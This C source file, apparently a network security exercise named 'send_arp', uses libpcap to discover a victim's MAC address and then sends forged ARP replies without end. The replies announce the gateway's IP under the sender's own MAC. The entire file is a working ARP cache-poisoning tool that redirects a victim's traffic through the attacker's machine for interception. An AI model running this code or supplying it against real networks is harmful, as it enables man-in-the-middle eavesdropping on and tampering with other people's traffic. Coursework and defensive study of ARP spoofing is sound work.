#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include "stc.h"
#include "get_mac.h"

#define hardware_type_value 0x0001
#define protocol_type_value 0x0800
#define ARP_value 0x0806
#define hardware_len_value 6
#define protocol_len_value 4
#define request_op 0x0001
#define reply_op 0x0002


void usage() {
  printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
  printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");

}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }

    struct _request_arp_packet rp;
    struct _Ethernet_header eh;
    struct _reply_arp_packet rep;


    unsigned char zero_address[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    unsigned char broadcast_address[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    unsigned char gateway_address[6] = {0x84, 0x98 ,0x66, 0xf2, 0x6d, 0x3b};
    unsigned char victim_MAC[6] = {0x00,0x00,0x00,0x00,0x00,0x00};

    u_char vic_ip[4];
    u_char gate_ip[4];
    u_char src_ip[4]={0xc0, 0xa8, 0x2b, 0x8a};
    //u_char gate_ip[4]= {0,0,0,0};
    u_char my_mac_addr[6];

    get_mac_function(my_mac_addr);
    printf("\n my_MAC: %2x:%2x:%2x:%2x:%2x:%2x\n",my_mac_addr[0],my_mac_addr[1],my_mac_addr[2],my_mac_addr[3],my_mac_addr[4],my_mac_addr[5]);

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
      fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
      return -1;
    }


    u_char my_arp_request_packet[42];
    u_char my_arp_reply_packet[42];

    inet_pton(AF_INET, argv[2], &vic_ip);
    inet_pton(AF_INET, argv[3], &gate_ip);

    rp.hardware_type = htons(hardware_type_value);
    rp.protocol_type = htons(protocol_type_value);
    rp.hardware_len = hardware_len_value;
    rp.protocol_len = protocol_len_value;
    rp.opcode = htons(request_op);

    memcpy(rp.sender_mac, my_mac_addr, sizeof(my_mac_addr));
    memcpy(rp.sender_ip, src_ip,sizeof (src_ip));
    memcpy(rp.target_mac, zero_address, sizeof(zero_address));
    memcpy(rp.target_ip, vic_ip,sizeof (vic_ip));
    memcpy(eh.edst_mac, broadcast_address, sizeof(broadcast_address));
    memcpy(eh.esrc_mac, my_mac_addr, sizeof(my_mac_addr));
    eh.e_type = htons(ARP_value);

    memcpy(my_arp_request_packet, &eh, sizeof(eh));
    memcpy(my_arp_request_packet + 14, &rp, sizeof (rp) );


    printf("send arp request\n");
    int res1 = pcap_sendpacket(handle ,my_arp_request_packet , 42);
    if(res1 == 0) printf("request packet transport \n");
    int cnt=0;
    for(int i=0;i<42;i++){
        printf("%2x ",my_arp_request_packet[i]);
        cnt++;
        if(cnt==16) {
            cnt=0;
            printf("\n");
        }
    }

    while(1){
        struct pcap_pkthdr* header;
        const u_char* packet;
        u_char* TCP_HEADER;
        int res = pcap_next_ex(handle, &header, &packet);
            const u_char* mac_packet = packet;
            victim_MAC[0] = mac_packet[6];
            victim_MAC[1] = mac_packet[7];
            victim_MAC[2] = mac_packet[8];
            victim_MAC[3] = mac_packet[9];
            victim_MAC[4] = mac_packet[10];
            victim_MAC[5] = mac_packet[11];

      if(packet[20]==0x00 & packet[21] == 0x02) break;

    }
    printf("\n victimMAC : %2x,%2x,%2x,%2x,%2x,%2x\n",victim_MAC[0],victim_MAC[1],victim_MAC[2],victim_MAC[3],victim_MAC[4],victim_MAC[5]);




    rep.hardware_type = htons(hardware_type_value);
    rep.protocol_type = htons(protocol_type_value);
    rep.hardware_len = hardware_len_value;
    rep.protocol_len = protocol_len_value;
    rep.opcode = htons(reply_op);

    //src ip = gateway value input, src mac = my value input

    memcpy(rep.sender_mac, my_mac_addr, sizeof(my_mac_addr));
    memcpy(rep.sender_ip, gate_ip, sizeof (gate_ip));
    memcpy(rep.target_mac, victim_MAC, sizeof(victim_MAC));
    memcpy(rep.target_ip, vic_ip, sizeof (vic_ip));
    memcpy(eh.edst_mac, victim_MAC, sizeof(victim_MAC));
    memcpy(eh.esrc_mac, my_mac_addr, sizeof(my_mac_addr));
    eh.e_type = htons(ARP_value);

    memcpy(my_arp_reply_packet, &eh, sizeof(eh));
    memcpy(my_arp_reply_packet + 14, &rep, sizeof (rep) );

    while (1) {

        int res2 = pcap_sendpacket(handle , my_arp_reply_packet, 42);
        if(res2 == 0) printf("\n reply packet transport \n");
        int cnt1=0;
        for(int i = 0; i < 42; i++){
            printf("%2x ", my_arp_reply_packet[i]);
            cnt1++;
            if(cnt1==16) {
                cnt1=0;
                printf("\n");
            }
        }
    }
    printf("\n");
  pcap_close(handle);
  return 0;

}

